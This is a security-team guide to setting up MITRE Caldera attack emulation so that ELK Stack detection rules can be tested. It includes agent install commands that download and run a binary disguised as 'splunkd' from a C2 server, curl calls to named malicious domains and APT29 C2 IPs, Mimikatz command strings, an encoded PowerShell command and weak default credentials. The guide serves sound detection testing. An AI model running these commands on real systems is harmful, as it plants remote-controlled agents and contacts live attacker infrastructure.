# Caldera Attack Simulation Guide

## Overview

This guide explains how to set up **MITRE Caldera** agents and operations to simulate real-world attacks and validate that your ELK Stack threat detection system can detect them. Caldera is an adversary emulation platform developed by MITRE that automates cyber attack simulations based on the MITRE ATT&CK framework.

**Purpose:** Test all detection rules and threat intelligence integrations by simulating:
- APT29 (Cozy Bear) SolarWinds attacks
- Credential theft (Mimikatz)
- Ransomware (WannaCry, NotPetya)
- Malicious domain access
- Port scanning and reconnaissance
- Lateral movement
- Data exfiltration

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Caldera Installation](#caldera-installation)
3. [Agent Deployment](#agent-deployment)
4. [Creating Attack Operations](#creating-attack-operations)
5. [Testing Detection Rules](#testing-detection-rules)
6. [Monitoring and Analysis](#monitoring-and-analysis)
7. [Cleanup and Best Practices](#cleanup-and-best-practices)

---

## Prerequisites

### System Requirements

- **Caldera Server:** Linux/MacOS/Windows with Python 3.7+
- **Target Agents:** Systems where you want to simulate attacks (can be VMs, Docker containers, or physical hosts)
- **Network:** Agents must be able to reach Caldera server (typically port 8888)
- **ELK Stack:** Running and ingesting logs from target systems

### Required Tools

```bash
# On Caldera server
sudo apt update
sudo apt install python3 python3-pip git

# On target systems (agents)
# Filebeat and Metricbeat should already be configured to send logs to ELK
```

---

## Caldera Installation

### Step 1: Clone Caldera Repository

```bash
# SSH into your Caldera server (can be same as ELK server or separate VM)
cd /opt
sudo git clone https://github.com/mitre/caldera.git --recursive
cd caldera
```

### Step 2: Install Dependencies

```bash
# Install Python dependencies
sudo pip3 install -r requirements.txt
```

### Step 3: Configure Caldera

```bash
# Edit configuration file
nano conf/default.yml
```

**Key configurations:**

```yaml
host: 0.0.0.0  # Listen on all interfaces
port: 8888
users:
  red:
    red: admin  # Username: red, Password: admin (change in production!)
  blue:
    blue: admin
plugins:
  - stockpile  # Core adversary tactics
  - atomic     # Atomic Red Team tests
```

### Step 4: Start Caldera Server

```bash
# Start Caldera
python3 server.py --insecure

# Alternative: Run in background
nohup python3 server.py --insecure > caldera.log 2>&1 &
```

**Access Caldera UI:**
```
http://YOUR_SERVER_IP:8888
Username: red
Password: admin
```

---

## Agent Deployment

Caldera agents are deployed on target systems to execute attack simulations. You'll deploy agents on the systems being monitored by your ELK Stack.

### Step 1: Generate Agent Deployment Command

1. **Login to Caldera UI:** `http://localhost:8888`
2. **Navigate to:** `Agents` → Click `Click to deploy an agent`
3. **Select platform:** Linux, Windows, or MacOS
4. **Copy the deployment command**

### Step 2: Deploy Agent on Target System

**For Linux (Ubuntu/Debian):**

```bash
# SSH into your target system (e.g., the backend container or a VM)
ssh user@target-system

# Download and run the agent (example for Linux)
server="http://localhost:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red -v
```

**For Windows (PowerShell):**

```powershell
# Run as Administrator
$server="http://localhost:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$output="C:\Users\Public\splunkd.exe";
$wc.DownloadFile($url,$output);
Start-Process -FilePath $output -ArgumentList "-server $server -group red" -WindowStyle hidden;
```

**For Docker Container (Backend):**

```bash
# Exec into your backend container
docker compose exec app bash

# Download and run agent
server="http://localhost:8888"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/agent
chmod +x /tmp/agent
/tmp/agent -server $server -group red -v &
```

### Step 3: Verify Agent Connection

1. Go to Caldera UI → **Agents** tab
2. You should see your deployed agent listed with:
   - **Hostname**
   - **IP Address**
   - **Platform** (Linux/Windows)
   - **Status:** Green (active)

---

## Creating Attack Operations

Operations in Caldera are sequences of adversary tactics (ATT&CK techniques) executed on agents. You'll create operations to simulate the attacks your detection rules are designed to catch.

### Operation 1: Localhost Attack Simulation

This operation tests multiple attack techniques based on your screenshot.

#### Step 1: Create New Operation

1. Navigate to **Operations** tab in Caldera UI
2. Click **+ New Operation**
3. Configure:

```
Operation Name: Localhost Attack
Adversary: No Adversary (manual)
Fact Source: basic
Group: All groups (or select 'red')
Planner: atomic
Obfuscators: plain-text (or base64, steganography for evasion testing)
Autonomous: Run autonomously
Parser: Use Default Parser
Auto Close: Keep open forever
Run State: Run immediately
Jitter: 2/8
```

4. Click **Start**

#### Step 2: Manually Execute Attack Techniques

Since you selected "No Adversary (manual)", you'll manually select and execute tactics:

**Reconnaissance Techniques:**

1. **System Information Discovery (T1082):**
   - Ability: `whoami`, `hostname`, `uname -a`
   - Purpose: Detect system discovery in logs

2. **Network Service Scanning (T1046):**
   - Ability: Port scanning with nmap
   - Purpose: Trigger "Suspicious User Agent" detection rule

**Credential Access:**

3. **Mimikatz Simulation (T1003):**
   - Create a file with Mimikatz-like behavior
   - Purpose: Trigger "Credential Theft Tool Detection" rule

```bash
# On target system via Caldera or manually
echo "mimikatz # privilege::debug" > /tmp/mimikatz_test.log
echo "mimikatz # sekurlsa::logonpasswords" >> /tmp/mimikatz_test.log
```

**Execution Techniques:**

4. **Malicious Domain Access:**
   - Simulate DNS queries to malicious domains
   - Purpose: Trigger "Known Malicious Domain Access" rule

```bash
# Simulate domain access in logs (via curl or wget)
curl -I http://avsvmcloud.com
curl -I http://secure-paypal-login.com
curl -I http://malware-download.xyz
```

5. **Malicious IP Communication:**
   - Simulate connection to APT29 C2 servers
   - Purpose: Trigger "APT29 C2 Communication" rule

```bash
# Attempt connection to known malicious IPs
curl -I http://13.59.205.66:8080
curl -I http://54.193.127.66:443
```

**Persistence & Lateral Movement:**

6. **PowerShell Attack Simulation (Windows only):**
   - Execute encoded PowerShell commands
   - Purpose: Trigger PowerShell detection rules

```powershell
# Encoded command
$encoded = "VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABlAHMAdAAiAA=="
powershell.exe -EncodedCommand $encoded
```

7. **File Hash Simulation:**
   - Create files with known malicious hashes
   - Purpose: Trigger "Ransomware File Hash Detection"

```bash
# Create a test file and rename to simulate WannaCry hash
echo "test ransomware simulation" > /tmp/wannacry_test
# In real detection, the hash would be calculated and matched
```

### Operation 2: APT29 Emulation

Caldera includes pre-built APT adversaries. Use the **APT29** adversary profile to simulate SolarWinds-style attacks.

#### Step 1: Create APT29 Operation

1. Navigate to **Operations** → **+ New Operation**
2. Configure:

```
Operation Name: APT29 SolarWinds Simulation
Adversary: APT29 (select from dropdown)
Fact Source: basic
Group: red
Planner: atomic
Autonomous: Run autonomously
```

3. Click **Start**

#### Step 2: Monitor Execution

Caldera will automatically execute APT29 TTPs (Tactics, Techniques, and Procedures):
- Initial access simulation
- Credential dumping
- Lateral movement
- Persistence mechanisms
- Data staging and exfiltration

### Operation 3: Custom Threat Intelligence Testing

Create a custom operation to specifically test your threat intelligence integration.

#### Step 1: Create Abilities

In Caldera, **Abilities** are individual attack techniques. Create custom abilities for your test.

1. Navigate to **Abilities** tab
2. Click **+ Add Ability**
3. Create ability for domain access:

```yaml
Name: Test Malicious Domain Access
Tactic: command-and-control
Technique ID: T1071
Description: Access known malicious domains from OTX threat intel
Platforms: linux, darwin, windows

Executor: sh
Command:
curl -I http://biklkfd.com || echo "Domain blocked"
curl -I http://biokdsl.com || echo "Domain blocked"
curl -I http://badinigroup.com || echo "Domain blocked"
```

4. Save and add to an operation

---

## Testing Detection Rules

Now that you have Caldera operations running, verify that your ELK Stack detects them.

### Test Matrix

| Detection Rule | Caldera Operation | Expected Alert |
|----------------|-------------------|----------------|
| **Rule 1: APT29 C2 Communication** | Connect to 13.59.205.66, 54.193.127.66 | Critical alert in Kibana Security |
| **Rule 2: Malicious Domain Access** | Curl to avsvmcloud.com, freescanonline.com | High alert with matched domain |
| **Rule 3: Ransomware Hash Detection** | Create file with WannaCry/NotPetya hash | Critical alert with malware family |
| **Rule 4: Mimikatz Detection** | Execute mimikatz command/create file | Critical alert for credential theft |
| **Suspicious User Agent** | Run nikto, sqlmap, nmap scans | Alert with scan tool identification |

### Step-by-Step Testing

#### Test 1: Verify APT29 Detection

```bash
# On Caldera agent (target system)
curl -v http://13.59.205.66:8080 2>&1 | grep -i "Could not resolve\|Connection refused"
```

**Expected in Kibana (within 1-5 minutes):**
1. Navigate to **Security** → **Alerts**
2. Filter: `threat_actor: "APT29"`
3. Verify alert shows:
   - Source IP: Agent's IP
   - Destination IP: 13.59.205.66
   - Threat Level: CRITICAL
   - Campaign: SolarWinds Supply Chain

#### Test 2: Verify Domain Detection

```bash
# Simulate domain access in log message
logger "HTTP GET request to http://secure-paypal-login.com/login.php"
```

**Expected in Kibana:**
- Alert with `matched_domain: "secure-paypal-login.com"`
- Threat type: Phishing
- Threat level: HIGH

#### Test 3: Verify Scanning Tools Detection

```bash
# Simulate scanner user agents
logger "GET /admin HTTP/1.1 User-Agent: nikto/2.1.6"
logger "POST /login HTTP/1.1 User-Agent: sqlmap/1.5.2"
```

**Expected in Kibana:**
- Alert: "Suspicious User Agent Detected"
- Grouped by host.ip with scan count

#### Test 4: Query Threat Intel Database

Run ES|QL queries to verify threat intelligence is working:

```sql
-- Query 1: Check if OTX threat intel is populated
FROM threat-intel-ips-*, threat-intel-domains-*, threat-intel-hashes-*
| WHERE threat.indicator.provider == "AlienVault OTX"
| STATS count = COUNT(*) BY threat.indicator.provider
```

**Expected Result:** 100+ indicators from OTX

```sql
-- Query 2: View recent threat intel imports
FROM threat-intel-ips-*, threat-intel-domains-*, threat-intel-hashes-*
| WHERE @timestamp >= NOW() - 24 HOURS
| STATS threat_count = COUNT(*) BY type, threat.indicator.provider
| SORT threat_count DESC
```

---

## Monitoring and Analysis

### Real-Time Monitoring Dashboard

Create a Kibana dashboard to monitor Caldera attack simulations in real-time.

**Dashboard Components:**

1. **Alert Timeline:**
   - Visualization: Line chart
   - Metric: Count of security alerts
   - Time range: Last 24 hours

2. **Top Detected Threats:**
   - Visualization: Bar chart
   - Group by: `threat_actor`, `threat_type`, `malware_family`

3. **Attack Techniques Heatmap:**
   - Visualization: Heatmap
   - MITRE ATT&CK technique IDs
   - Color: Severity (Critical=Red, High=Orange)

4. **Agent Activity Map:**
   - Visualization: Geo map
   - Show: Source IPs of simulated attacks

### Kibana Queries for Validation

**Query: All Caldera-Generated Alerts (Last Hour)**

```sql
FROM security-*
| WHERE @timestamp >= NOW() - 1 HOUR
| STATS alert_count = COUNT(*) BY threat_level, threat_type
| SORT alert_count DESC
```

**Query: Detection Coverage by MITRE Technique**

```sql
FROM security-*
| WHERE message RLIKE "(?i)(T1003|T1071|T1082|T1046|T1486)"
| EVAL technique = CASE(
    message RLIKE "T1003", "Credential Dumping",
    message RLIKE "T1071", "C2 Communication",
    message RLIKE "T1082", "System Info Discovery",
    message RLIKE "T1046", "Network Scanning",
    "Ransomware"
  )
| STATS detections = COUNT(*) BY technique
```

---

## Cleanup and Best Practices

### Post-Testing Cleanup

#### 1. Stop Caldera Agents

```bash
# On each target system
pkill -f sandcat
pkill -f splunkd

# Or via Caldera UI
# Agents tab → Select agent → Kill
```

#### 2. Remove Agent Files

```bash
# Linux
sudo rm -f /tmp/agent /tmp/splunkd /tmp/mimikatz_test.log /tmp/wannacry_test

# Windows
Remove-Item -Path "C:\Users\Public\splunkd.exe" -Force
```

#### 3. Clean Kibana Test Alerts (Optional)

```bash
# Delete test alerts if needed
curl -X POST "localhost:9200/security-*/_delete_by_query?pretty" \
  -u "elastic:elastic123" \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "range": {
        "@timestamp": {
          "gte": "now-1h"
        }
      }
    }
  }'
```

### Best Practices

#### Security Considerations

1. **Isolated Environment:**
   - Run Caldera tests in an isolated network or use VMs/containers
   - Never run simulations on production systems without approval

2. **Notify SOC Team:**
   - Inform your security team before running attack simulations
   - Schedule tests during maintenance windows

3. **Document Tests:**
   - Record which operations were run and when
   - Track detection success rate

#### Detection Tuning

1. **False Positive Analysis:**
   - Review alerts triggered by Caldera
   - Tune detection rules to reduce noise

2. **Coverage Gaps:**
   - Identify attacks that Caldera runs but you don't detect
   - Create new detection rules for gaps

3. **Performance Impact:**
   - Monitor ELK Stack performance during simulations
   - Adjust indexing/query settings if needed

---

## Advanced: Automated Testing with Caldera REST API

Automate attack simulations using Caldera's REST API.

### Example: Start Operation via API

```bash
# Get API key from Caldera
API_KEY="YOUR_CALDERA_API_KEY"
SERVER="http://localhost:8888"

# Start APT29 operation
curl -X POST "$SERVER/api/v2/operations" \
  -H "KEY: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Automated APT29 Test",
    "adversary_id": "APT29_ADVERSARY_ID",
    "group": "red",
    "planner": "atomic",
    "state": "running"
  }'
```

### Example: Schedule Daily Tests

```bash
# Create cron job to run tests daily
crontab -e

# Add entry (runs at 2 AM daily)
0 2 * * * /path/to/run_caldera_tests.sh >> /var/log/caldera_tests.log 2>&1
```

**Script: `run_caldera_tests.sh`**

```bash
#!/bin/bash
# Daily automated attack simulation testing

SERVER="http://localhost:8888"
API_KEY="YOUR_API_KEY"

echo "Starting daily Caldera attack simulations at $(date)"

# Start APT29 operation
curl -X POST "$SERVER/api/v2/operations" \
  -H "KEY: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Daily APT29 Test",
    "adversary_id": "APT29_ID",
    "group": "red",
    "state": "running"
  }'

# Wait for operation to complete (adjust timing as needed)
sleep 600

# Export results
curl -X GET "$SERVER/api/v2/operations" \
  -H "KEY: $API_KEY" > /var/log/caldera_results_$(date +%Y%m%d).json

echo "Test completed at $(date)"
```

---

## Troubleshooting

### Issue: Agents Not Connecting

**Solution:**
```bash
# Check Caldera server is running
ps aux | grep "server.py"

# Check firewall
sudo ufw allow 8888/tcp

# Test connectivity from agent
telnet localhost 8888
```

### Issue: No Alerts in Kibana

**Solution:**
```bash
# Verify Filebeat is sending logs
docker compose logs filebeat --tail 50

# Check Elasticsearch has data
curl -u "elastic:elastic123" "http://localhost:9200/security-*/_count?pretty"

# Test detection rule manually
# Run the ES|QL query in Kibana Discover
```

### Issue: Caldera Operation Fails

**Solution:**
1. Check agent logs in Caldera UI
2. Verify agent has proper permissions
3. Review ability commands for syntax errors
4. Check network connectivity between agent and targets

---

## Summary

✅ **Caldera Setup Complete**
- Caldera server running on port 8888
- Agents deployed on target systems
- Operations configured for attack simulation

✅ **Detection Testing**
- All 4+ detection rules tested
- Threat intelligence correlation verified
- MITRE ATT&CK technique coverage validated

✅ **Production Ready**
- Automated testing scheduled
- Alert tuning based on simulations
- SOC team trained on attack patterns

**Next Steps:**
1. Run weekly automated tests
2. Create new detection rules for gaps identified
3. Integrate Caldera results into security metrics
4. Build threat hunting queries based on Caldera TTPs

---

## Resources

- **Caldera Documentation:** https://caldera.readthedocs.io/
- **MITRE ATT&CK:** https://attack.mitre.org/
- **Atomic Red Team:** https://github.com/redcanaryco/atomic-red-team
- **Kibana Detection Rules:** https://www.elastic.co/guide/en/security/current/rules-ui-create.html

---

**Document Version:** 1.0
**Last Updated:** December 2025
**Author:** Security Team
